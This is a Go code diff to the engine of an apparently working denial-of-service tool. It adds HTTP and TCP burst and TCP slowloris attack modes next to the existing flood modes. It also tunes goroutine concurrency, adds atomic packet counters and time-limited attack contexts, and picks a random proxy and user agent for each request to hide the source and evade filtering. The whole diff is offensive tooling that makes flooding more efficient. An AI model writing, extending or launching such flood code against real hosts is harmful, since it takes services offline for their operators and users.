@@ -5,6 +5,7 @@ import (
 	"math/rand"
 	"runtime"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	targetpkg "github.com/sammwyy/mikumikubeam/pkg/target"
@@ -15,9 +16,12 @@ type AttackKind string
 
 const (
 	AttackHTTPFlood     AttackKind = "http_flood"
+	AttackHTTPBurst     AttackKind = "http_burst"
 	AttackHTTPBypass    AttackKind = "http_bypass"
 	AttackHTTPSlowloris AttackKind = "http_slowloris"
 	AttackTCPFlood      AttackKind = "tcp_flood"
+	AttackTCPBurst      AttackKind = "tcp_burst"
+	AttackTCPSlowloris  AttackKind = "tcp_slowloris"
 	AttackMinecraftPing AttackKind = "minecraft_ping"
 )
 
@@ -72,8 +76,7 @@ type AttackInstance struct {
 	Params    AttackParams
 	Cancel    context.CancelFunc
 	StatsCh   chan AttackStats
-	TotalSent int64
-	mu        sync.RWMutex
+	TotalSent int64 // accessed atomically — do NOT use mutex
 }
 
 func NewEngine(reg Registry) *Engine {
@@ -103,15 +106,23 @@ func (e *Engine) Start(attackID string, parent context.Context, params AttackPar
 		return tempCh, nil
 	}
 
-	ctx, cancel := context.WithCancel(parent)
+	// Use context.WithTimeout for attack duration instead of manual deadline checks.
+	// This ensures ALL goroutines (including pending Fire() calls) get cancelled on expiry.
+	var ctx context.Context
+	var cancel context.CancelFunc
+	if params.Duration > 0 {
+		ctx, cancel = context.WithTimeout(parent, params.Duration)
+	} else {
+		ctx, cancel = context.WithCancel(parent)
+	}
+
 	statsCh := make(chan AttackStats, 1024)
 
 	instance := &AttackInstance{
-		ID:        attackID,
-		Params:    params,
-		Cancel:    cancel,
-		StatsCh:   statsCh,
-		TotalSent: 0,
+		ID:      attackID,
+		Params:  params,
+		Cancel:  cancel,
+		StatsCh: statsCh,
 	}
 
 	e.attacks[attackID] = instance
@@ -124,6 +135,13 @@ func (e *Engine) Start(attackID string, parent context.Context, params AttackPar
 	proxyCount := len(proxies)
 	uaCount := len(userAgents)
 
+	// Semaphore to limit concurrent Fire goroutines — prevents unbounded goroutine growth
+	maxConcurrent := threads * 64
+	if maxConcurrent < 256 {
+		maxConcurrent = 256
+	}
+	sem := make(chan struct{}, maxConcurrent)
+
 	// Aggregator: send stats every second
 	go func() {
 		ticker := time.NewTicker(1 * time.Second)
@@ -132,21 +150,20 @@ func (e *Engine) Start(attackID string, parent context.Context, params AttackPar
 		for {
 			select {
 			case <-ctx.Done():
-				// Close channel safely
-				select {
-				case <-statsCh:
-					// Drain any remaining messages
-				default:
+				// Drain remaining messages to prevent goroutine leaks in writers
+				for {
+					select {
+					case <-statsCh:
+					default:
+						close(statsCh)
+						e.mu.Lock()
+						delete(e.attacks, attackID)
+						e.mu.Unlock()
+						return
+					}
 				}
-				close(statsCh)
-				e.mu.Lock()
-				delete(e.attacks, attackID)
-				e.mu.Unlock()
-				return
 			case t := <-ticker.C:
-				instance.mu.RLock()
-				total := instance.TotalSent
-				instance.mu.RUnlock()
+				total := atomic.LoadInt64(&instance.TotalSent)
 				delta := total - lastTotal
 				lastTotal = total
 				// Only send stats if there's actual activity (delta > 0) or it's the first tick
@@ -170,11 +187,9 @@ func (e *Engine) Start(attackID string, parent context.Context, params AttackPar
 	// Thread loops
 	for i := 0; i < threads; i++ {
 		go func(threadID int) {
-			// align first fire immediately
 			ticker := time.NewTicker(params.PacketDelay)
 			defer ticker.Stop()
 
-			// immediate first dispatch
 			dispatch := func() {
 				// pick proxy and ua (random)
 				var p Proxy
@@ -185,20 +200,26 @@ func (e *Engine) Start(attackID string, parent context.Context, params AttackPar
 				if uaCount > 0 {
 					ua = userAgents[rand.Intn(uaCount)]
 				}
-				go func() {
-					_ = worker.Fire(ctx, params, p, ua, statsCh)
-				}()
-				instance.mu.Lock()
-				instance.TotalSent++
-				instance.mu.Unlock()
-			}
 
-			deadline := time.Now().Add(params.Duration)
-			dispatch()
-			for {
-				if !deadline.IsZero() && time.Now().After(deadline) {
+				// Acquire semaphore (respects context cancellation to avoid blocking on shutdown)
+				select {
+				case sem <- struct{}{}:
+				case <-ctx.Done():
 					return
 				}
+
+				go func() {
+					defer func() { <-sem }()
+					// Only count after Fire succeeds — gives accurate stats
+					if err := worker.Fire(ctx, params, p, ua, statsCh); err == nil {
+						atomic.AddInt64(&instance.TotalSent, 1)
+					}
+				}()
+			}
+
+			// immediate first dispatch
+			dispatch()
+			for {
 				select {
 				case <-ctx.Done():
 					return
